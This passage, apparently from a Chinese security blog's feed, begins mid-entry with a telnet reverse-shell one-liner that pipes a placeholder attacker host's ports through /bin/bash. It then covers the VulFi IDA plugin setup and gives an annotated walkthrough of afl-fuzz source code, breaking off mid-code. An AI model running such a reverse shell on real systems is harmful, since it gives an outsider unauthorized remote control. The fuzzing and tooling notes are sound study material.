<li>telnet在攻击者主机x.x.x.x及port1开启监听用户，并将此处Telnet的标准输入通过管道符传给后面命令<code>/bin/bash</code>执行，再将<code>/bin/bash</code>的输出结果作为后面<code>telnet</code>的输入。此时通过两个端口，一个接收用户输入，通过<code>/bin/bash</code>处理后再由另一个端口输出。</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># (x.x.x.x为攻击机ip)</span></span><br><span class="line">$ telnet x.x.x.x 6666 | /bin/bash | telnet x.x.x.x 5555</span><br><span class="line"><span class="comment"># 我们监听5555端口</span></span><br></pre></td></tr></table></figure>

<h2 id="more"><a href="#more" class="headerlink" title="more"></a>more</h2><p>IDA漏洞扫描插件：<a href="https://github.com/Accenture/VulFi">VulFi: IDA Pro plugin for query based searching within the binary useful mainly for vulnerability research</a></p>
<p>工具安装：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ git <span class="built_in">clone</span> https://github.com/Accenture/VulFi</span><br></pre></td></tr></table></figure>

<p>然后将某些文件其放在ida&#x2F;plugins目录下</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">cp</span> vulfi.py vulfi_prototypes.json vulfi_rules.json ~/~/idafree-8.4/plugins</span><br></pre></td></tr></table></figure>

<p>在search栏就能找到 <code>VulFi</code> 图标</p>
<p>写自己的规则：将alt_names 改成自己的列表就行，可以参考默认的。</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">[</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;RULE NAME&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;alt_names&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span></span><br><span class="line">            <span class="string">&quot;function_name_to_look_for&quot;</span></span><br><span class="line">        <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;wrappers&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;mark_if&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;High&quot;</span><span class="punctuation">:</span><span class="string">&quot;True&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Medium&quot;</span><span class="punctuation">:</span><span class="string">&quot;False&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Low&quot;</span><span class="punctuation">:</span> <span class="string">&quot;False&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">]</span></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>CSE</category>
      </categories>
      <tags>
        <tag>IoT</tag>
      </tags>
  </entry>
  <entry>
    <title>afl-fuzz</title>
    <url>/2024/03/25/afl-fuzz/</url>
    <content><![CDATA[<blockquote>
<p>FUZZ</p>
</blockquote>
<span id="more"></span>

<p>corpus: 语料库，fuzzer的输入</p>
<p>mutation: 变异</p>
<ul>
<li>deterministic 确定性变异</li>
</ul>
<h2 id="参数初始化"><a href="#参数初始化" class="headerlink" title="参数初始化"></a>参数初始化</h2><p>处理命令行参数</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>** argv)</span> </span>&#123;</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">SAYF</span>(cCYA <span class="string">&quot;afl-fuzz &quot;</span> cBRI VERSION cRST <span class="string">&quot; by &lt;lcamtuf@google.com&gt;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  doc_path = <span class="built_in">access</span>(DOC_PATH, F_OK) ? <span class="string">&quot;docs&quot;</span> : DOC_PATH;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">gettimeofday</span>(&amp;tv, &amp;tz);</span><br><span class="line">  <span class="built_in">srandom</span>(tv.tv_sec ^ tv.tv_usec ^ <span class="built_in">getpid</span>());</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 使用getopt函数，处理afl-fuzz的参数</span></span><br><span class="line">  <span class="keyword">while</span> ((opt = <span class="built_in">getopt</span>(argc, argv, <span class="string">&quot;+i:o:f:m:b:t:T:dnCB:S:M:x:QV&quot;</span>)) &gt; <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (opt) &#123;</span><br><span class="line">      <span class="comment">// -i: input dir，包含输入的文件夹, corpus 目录</span></span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;i&#x27;</span>: <span class="comment">/* input dir */</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (in_dir) <span class="built_in">FATAL</span>(<span class="string">&quot;Multiple -i options not supported&quot;</span>);</span><br><span class="line">        in_dir = optarg;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(in_dir, <span class="string">&quot;-&quot;</span>)) in_place_resume = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      <span class="comment">// -o: output dir 将结果输出</span></span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;o&#x27;</span>: <span class="comment">/* output dir */</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (out_dir) <span class="built_in">FATAL</span>(<span class="string">&quot;Multiple -o options not supported&quot;</span>);</span><br><span class="line">        out_dir = optarg;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      <span class="comment">// -M: master 主要的fuzzer</span></span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;M&#x27;</span>: &#123; <span class="comment">/* master sync ID */</span></span><br><span class="line"></span><br><span class="line">          u8* c;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (sync_id) <span class="built_in">FATAL</span>(<span class="string">&quot;Multiple -S or -M options not supported&quot;</span>);</span><br><span class="line">          sync_id = <span class="built_in">ck_strdup</span>(optarg);</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> ((c = <span class="built_in">strchr</span>(sync_id, <span class="string">&#x27;:&#x27;</span>))) &#123;</span><br><span class="line"></span><br><span class="line">            *c = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">sscanf</span>(c + <span class="number">1</span>, <span class="string">&quot;%u/%u&quot;</span>, &amp;master_id, &amp;master_max) != <span class="number">2</span> ||</span><br><span class="line">                !master_id || !master_max || master_id &gt; master_max ||</span><br><span class="line">                master_max &gt; <span class="number">1000000</span>) <span class="built_in">FATAL</span>(<span class="string">&quot;Bogus master ID passed to -M&quot;</span>);</span><br><span class="line"></span><br><span class="line">          &#125;</span><br><span class="line">          <span class="comment">// 要执行 deterministic 变异</span></span><br><span class="line">          force_deterministic = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      <span class="comment">// -S: Slave 从fuzzer</span></span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;S&#x27;</span>: </span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (sync_id) <span class="built_in">FATAL</span>(<span class="string">&quot;Multiple -S or -M options not supported&quot;</span>);</span><br><span class="line">        sync_id = <span class="built_in">ck_strdup</span>(optarg);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      <span class="comment">// -f: 目标程序是从某个固定的文件读入，则可以通过 -f 选项告知 afl-fuzz</span></span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;f&#x27;</span>: <span class="comment">/* target file */</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (out_file) <span class="built_in">FATAL</span>(<span class="string">&quot;Multiple -f options not supported&quot;</span>);</span><br><span class="line">        out_file = optarg;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      <span class="comment">// -x </span></span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;x&#x27;</span>: <span class="comment">/* dictionary */</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (extras_dir) <span class="built_in">FATAL</span>(<span class="string">&quot;Multiple -x options not supported&quot;</span>);</span><br><span class="line">        extras_dir = optarg;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      <span class="comment">// -t: 设置超时时间，ms</span></span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;t&#x27;</span>: &#123; <span class="comment">/* timeout */</span></span><br><span class="line"></span><br><span class="line">          u8 suffix = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (timeout_given) <span class="built_in">FATAL</span>(<span class="string">&quot;Multiple -t options not supported&quot;</span>);</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (<span class="built_in">sscanf</span>(optarg, <span class="string">&quot;%u%c&quot;</span>, &amp;exec_tmout, &amp;suffix) &lt; <span class="number">1</span> ||</span><br><span class="line">              optarg[<span class="number">0</span>] == <span class="string">&#x27;-&#x27;</span>) <span class="built_in">FATAL</span>(<span class="string">&quot;Bad syntax used for -t&quot;</span>);</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (exec_tmout &lt; <span class="number">5</span>) <span class="built_in">FATAL</span>(<span class="string">&quot;Dangerously low value of -t&quot;</span>);</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (suffix == <span class="string">&#x27;+&#x27;</span>) timeout_given = <span class="number">2</span>; <span class="keyword">else</span> timeout_given = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">// -m 内存限制</span></span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;m&#x27;</span>: &#123; <span class="comment">/* mem limit */</span></span><br><span class="line"></span><br><span class="line">          u8 suffix = <span class="string">&#x27;M&#x27;</span>;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (mem_limit_given) <span class="built_in">FATAL</span>(<span class="string">&quot;Multiple -m options not supported&quot;</span>);</span><br><span class="line">          mem_limit_given = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">          <span class="comment">// none 代表不限制内存</span></span><br><span class="line">          <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(optarg, <span class="string">&quot;none&quot;</span>)) &#123;</span><br><span class="line"></span><br><span class="line">            mem_limit = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (<span class="built_in">sscanf</span>(optarg, <span class="string">&quot;%llu%c&quot;</span>, &amp;mem_limit, &amp;suffix) &lt; <span class="number">1</span> ||</span><br><span class="line">              optarg[<span class="number">0</span>] == <span class="string">&#x27;-&#x27;</span>) <span class="built_in">FATAL</span>(<span class="string">&quot;Bad syntax used for -m&quot;</span>);</span><br><span class="line"></span><br><span class="line">          <span class="comment">// 指定内存限制单位</span></span><br><span class="line">          <span class="keyword">switch</span> (suffix) &#123;</span><br><span class="line">  </span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;T&#x27;</span>: mem_limit *= <span class="number">1024</span> * <span class="number">1024</span>; <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;G&#x27;</span>: mem_limit *= <span class="number">1024</span>; <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;k&#x27;</span>: mem_limit /= <span class="number">1024</span>; <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;M&#x27;</span>: <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">default</span>:  <span class="built_in">FATAL</span>(<span class="string">&quot;Unsupported suffix or bad syntax for -m&quot;</span>);</span><br><span class="line"></span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (mem_limit &lt; <span class="number">5</span>) <span class="built_in">FATAL</span>(<span class="string">&quot;Dangerously low value of -m&quot;</span>);</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (<span class="built_in">sizeof</span>(<span class="type">rlim_t</span>) == <span class="number">4</span> &amp;&amp; mem_limit &gt; <span class="number">2000</span>)</span><br><span class="line">            <span class="built_in">FATAL</span>(<span class="string">&quot;Value of -m out of range on 32-bit systems&quot;</span>);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      </span><br><span class="line">      <span class="comment">// -b: bind core 绑定CPU核心</span></span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;b&#x27;</span>: &#123; <span class="comment">/* bind CPU core */</span></span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (cpu_to_bind_given) <span class="built_in">FATAL</span>(<span class="string">&quot;Multiple -b options not supported&quot;</span>);</span><br><span class="line">          cpu_to_bind_given = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (<span class="built_in">sscanf</span>(optarg, <span class="string">&quot;%u&quot;</span>, &amp;cpu_to_bind) &lt; <span class="number">1</span> ||</span><br><span class="line">              optarg[<span class="number">0</span>] == <span class="string">&#x27;-&#x27;</span>) <span class="built_in">FATAL</span>(<span class="string">&quot;Bad syntax used for -b&quot;</span>);</span><br><span class="line"></span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">// -d ：跳过 deterministic 几段</span></span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;d&#x27;</span>: <span class="comment">/* skip deterministic */</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (skip_deterministic) <span class="built_in">FATAL</span>(<span class="string">&quot;Multiple -d options not supported&quot;</span>);</span><br><span class="line">        skip_deterministic = <span class="number">1</span>;</span><br><span class="line">        use_splicing = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      <span class="comment">// 只关心shm某些位置？</span></span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;B&#x27;</span>: <span class="comment">/* load bitmap */</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">/* This is a secret undocumented option! It is useful if you find</span></span><br><span class="line"><span class="comment">           an interesting test case during a normal fuzzing process, and want</span></span><br><span class="line"><span class="comment">           to mutate it without rediscovering any of the test cases already</span></span><br><span class="line"><span class="comment">           found during an earlier run.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">           To use this mode, you need to point -B to the fuzz_bitmap produced</span></span><br><span class="line"><span class="comment">           by an earlier run for the exact same binary... and that&#x27;s it.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">           I only used this once or twice to get variants of a particular</span></span><br><span class="line"><span class="comment">           file, so I&#x27;m not making this an official setting. */</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (in_bitmap) <span class="built_in">FATAL</span>(<span class="string">&quot;Multiple -B options not supported&quot;</span>);</span><br><span class="line"></span><br><span class="line">        in_bitmap = optarg;</span><br><span class="line">        <span class="built_in">read_bitmap</span>(in_bitmap);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      <span class="comment">// 打开 crash exploration 模式</span></span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;C&#x27;</span>: <span class="comment">/* crash mode */</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (crash_mode) <span class="built_in">FATAL</span>(<span class="string">&quot;Multiple -C options not supported&quot;</span>);</span><br><span class="line">        crash_mode = FAULT_CRASH;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      </span><br><span class="line">      <span class="comment">// 打开 dumb mode，即黑盒模式，不插桩</span></span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;n&#x27;</span>: <span class="comment">/* dumb mode */</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (dumb_mode) <span class="built_in">FATAL</span>(<span class="string">&quot;Multiple -n options not supported&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">getenv</span>(<span class="string">&quot;AFL_DUMB_FORKSRV&quot;</span>)) dumb_mode = <span class="number">2</span>; <span class="keyword">else</span> dumb_mode = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      <span class="comment">// 换个 banner,theme?</span></span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;T&#x27;</span>: <span class="comment">/* banner */</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (use_banner) <span class="built_in">FATAL</span>(<span class="string">&quot;Multiple -T options not supported&quot;</span>);</span><br><span class="line">        use_banner = optarg;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      <span class="comment">// Qemu模式，也就是二进制fuzz</span></span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;Q&#x27;</span>: <span class="comment">/* QEMU mode */</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (qemu_mode) <span class="built_in">FATAL</span>(<span class="string">&quot;Multiple -Q options not supported&quot;</span>);</span><br><span class="line">        qemu_mode = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!mem_limit_given) mem_limit = MEM_LIMIT_QEMU;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      <span class="comment">// -V: version</span></span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;V&#x27;</span>: <span class="comment">/* Show version number */</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Version number has been printed already, just quit. */</span></span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line"></span><br><span class="line">        <span class="built_in">usage</span>(argv[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (optind == argc || !in_dir || !out_dir) <span class="built_in">usage</span>(argv[<span class="number">0</span>]);</span><br><span class="line">  <span class="comment">// ...</span></span><br></pre></td></tr></table></figure>


<p>比如说</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">echo</span> core | sudo <span class="built_in">tee</span> /proc/sys/kernel/core_pattern</span><br><span class="line">$ AFL_AUTO afl-fuzz -m none -i samples/ -o fuzzout/ -M master_fuzzer -- /path/to/exe @@</span><br></pre></td></tr></table></figure>

<p><code>@@</code> 代表了程序的参数，是个占位符，从<code>samples</code>下的文件读取内容</p>
<p>core_pattern：用于配置核心转储文件（core dump）的命名规则。核心转储文件是在程序发生严重错误（如段错误）时生成的内存转储文件，用于分析程序执行过程中的问题。</p>
<h3 id="setup-signal-handlers"><a href="#setup-signal-handlers" class="headerlink" title="setup_signal_handlers"></a>setup_signal_handlers</h3><p>注册信号处理函数</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Set up signal handlers. More complicated that needs to be, because libc on</span></span><br><span class="line"><span class="comment">   Solaris doesn&#x27;t resume interrupted reads(), sets SA_RESETHAND when you call</span></span><br><span class="line"><span class="comment">   siginterrupt(), and does other unnecessary things. */</span></span><br><span class="line"></span><br><span class="line"><span class="function">EXP_ST <span class="type">void</span> <span class="title">setup_signal_handlers</span><span class="params">(<span class="type">void</span>)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">sigaction</span> sa;</span><br><span class="line"></span><br><span class="line">  sa.sa_handler   = <span class="literal">NULL</span>;</span><br><span class="line">  sa.sa_flags     = SA_RESTART;</span><br><span class="line">  sa.sa_sigaction = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">sigemptyset</span>(&amp;sa.sa_mask);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Various ways of saying &quot;stop&quot;. */</span></span><br><span class="line"></span><br><span class="line">  sa.sa_handler = handle_stop_sig;</span><br><span class="line">  <span class="built_in">sigaction</span>(SIGHUP, &amp;sa, <span class="literal">NULL</span>);</span><br><span class="line">  <span class="built_in">sigaction</span>(SIGINT, &amp;sa, <span class="literal">NULL</span>);</span><br><span class="line">  <span class="built_in">sigaction</span>(SIGTERM, &amp;sa, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Exec timeout notifications. */</span></span><br><span class="line"></span><br><span class="line">  sa.sa_handler = handle_timeout;</span><br><span class="line">  <span class="built_in">sigaction</span>(SIGALRM, &amp;sa, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Window resize */</span></span><br><span class="line"></span><br><span class="line">  sa.sa_handler = handle_resize;</span><br><span class="line">  <span class="built_in">sigaction</span>(SIGWINCH, &amp;sa, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* SIGUSR1: skip entry */</span></span><br><span class="line"></span><br><span class="line">  sa.sa_handler = handle_skipreq;</span><br><span class="line">  <span class="built_in">sigaction</span>(SIGUSR1, &amp;sa, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Things we don&#x27;t care about. */</span></span><br><span class="line"></span><br><span class="line">  sa.sa_handler = SIG_IGN;</span><br><span class="line">  <span class="built_in">sigaction</span>(SIGTSTP, &amp;sa, <span class="literal">NULL</span>);</span><br><span class="line">  <span class="built_in">sigaction</span>(SIGPIPE, &amp;sa, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="check-asan-opts"><a href="#check-asan-opts" class="headerlink" title="check_asan_opts"></a>check_asan_opts</h3><p>检查ASAN&#x2F;MSAN相关的参数</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">check_asan_opts</span><span class="params">(<span class="type">void</span>)</span> </span>&#123;</span><br><span class="line">  u8* x = <span class="built_in">getenv</span>(<span class="string">&quot;ASAN_OPTIONS&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (x) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strstr</span>(x, <span class="string">&quot;abort_on_error=1&quot;</span>))</span><br><span class="line">      <span class="built_in">FATAL</span>(<span class="string">&quot;Custom ASAN_OPTIONS set without abort_on_error=1 - please fix!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strstr</span>(x, <span class="string">&quot;symbolize=0&quot;</span>))</span><br><span class="line">      <span class="built_in">FATAL</span>(<span class="string">&quot;Custom ASAN_OPTIONS set without symbolize=0 - please fix!&quot;</span>);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  x = <span class="built_in">getenv</span>(<span class="string">&quot;MSAN_OPTIONS&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (x) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strstr</span>(x, <span class="string">&quot;exit_code=&quot;</span> <span class="built_in">STRINGIFY</span>(MSAN_ERROR)))</span><br><span class="line">      <span class="built_in">FATAL</span>(<span class="string">&quot;Custom MSAN_OPTIONS set without exit_code=&quot;</span></span><br><span class="line">            <span class="built_in">STRINGIFY</span>(MSAN_ERROR) <span class="string">&quot; - please fix!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strstr</span>(x, <span class="string">&quot;symbolize=0&quot;</span>))</span><br><span class="line">      <span class="built_in">FATAL</span>(<span class="string">&quot;Custom MSAN_OPTIONS set without symbolize=0 - please fix!&quot;</span>);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<h3 id="fix-up-sync"><a href="#fix-up-sync" class="headerlink" title="fix_up_sync"></a>fix_up_sync</h3><p>当使用 Slave fuzzer时，<code>-S syncid</code>，为其初始化output dir。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Validate and fix up out_dir and sync_dir when using -S. */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">fix_up_sync</span><span class="params">(<span class="type">void</span>)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  u8* x = sync_id;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (dumb_mode)</span><br><span class="line">    <span class="built_in">FATAL</span>(<span class="string">&quot;-S / -M and -n are mutually exclusive&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (skip_deterministic) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (force_deterministic)</span><br><span class="line">      <span class="built_in">FATAL</span>(<span class="string">&quot;use -S instead of -M -d&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="built_in">FATAL</span>(<span class="string">&quot;-S already implies -d&quot;</span>);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (*x) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">isalnum</span>(*x) &amp;&amp; *x != <span class="string">&#x27;_&#x27;</span> &amp;&amp; *x != <span class="string">&#x27;-&#x27;</span>)</span><br><span class="line">      <span class="built_in">FATAL</span>(<span class="string">&quot;Non-alphanumeric fuzzer ID specified via -S or -M&quot;</span>);</span><br><span class="line"></span><br><span class="line">    x++;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">strlen</span>(sync_id) &gt; <span class="number">32</span>) <span class="built_in">FATAL</span>(<span class="string">&quot;Fuzzer ID too long&quot;</span>);</span><br><span class="line"></span><br><span class="line">  x = <span class="built_in">alloc_printf</span>(<span class="string">&quot;%s/%s&quot;</span>, out_dir, sync_id);</span><br><span class="line"></span><br><span class="line">  sync_dir = out_dir;</span><br><span class="line">  out_dir  = x;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!force_deterministic) &#123;</span><br><span class="line">    skip_deterministic = <span class="number">1</span>;</span><br><span class="line">    use_splicing = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="环境变量"><a href="#环境变量" class="headerlink" title="环境变量"></a>环境变量</h3><p>环境变量处理</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// fuzzer input 和 output 不能设置相同的目录</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">strcmp</span>(in_dir, out_dir))</span><br><span class="line">    <span class="built_in">FATAL</span>(<span class="string">&quot;Input and output directories can&#x27;t be the same&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// dump mode: dump_mode即没有插桩和确定性(deterministic)变异阶段的模式，黑盒测试</span></span><br><span class="line">  <span class="comment">// crash mode: 当程序因输入数据而崩溃时，AFL 会将相关信息记录下来，以便后续进行分析。</span></span><br><span class="line">  <span class="comment">// qemu mode: qemu 模式</span></span><br><span class="line">  <span class="keyword">if</span> (dumb_mode) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (crash_mode) <span class="built_in">FATAL</span>(<span class="string">&quot;-C and -n are mutually exclusive&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (qemu_mode)  <span class="built_in">FATAL</span>(<span class="string">&quot;-Q and -n are mutually exclusive&quot;</span>);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">getenv</span>(<span class="string">&quot;AFL_NO_FORKSRV&quot;</span>))    no_forkserver    = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">getenv</span>(<span class="string">&quot;AFL_NO_CPU_RED&quot;</span>))    no_cpu_meter_red = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">getenv</span>(<span class="string">&quot;AFL_NO_ARITH&quot;</span>))      no_arith         = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">getenv</span>(<span class="string">&quot;AFL_SHUFFLE_QUEUE&quot;</span>)) shuffle_queue    = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">getenv</span>(<span class="string">&quot;AFL_FAST_CAL&quot;</span>))      fast_cal         = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// hang 超时时间</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">getenv</span>(<span class="string">&quot;AFL_HANG_TMOUT&quot;</span>)) &#123;</span><br><span class="line">    hang_tmout = <span class="built_in">atoi</span>(<span class="built_in">getenv</span>(<span class="string">&quot;AFL_HANG_TMOUT&quot;</span>));</span><br><span 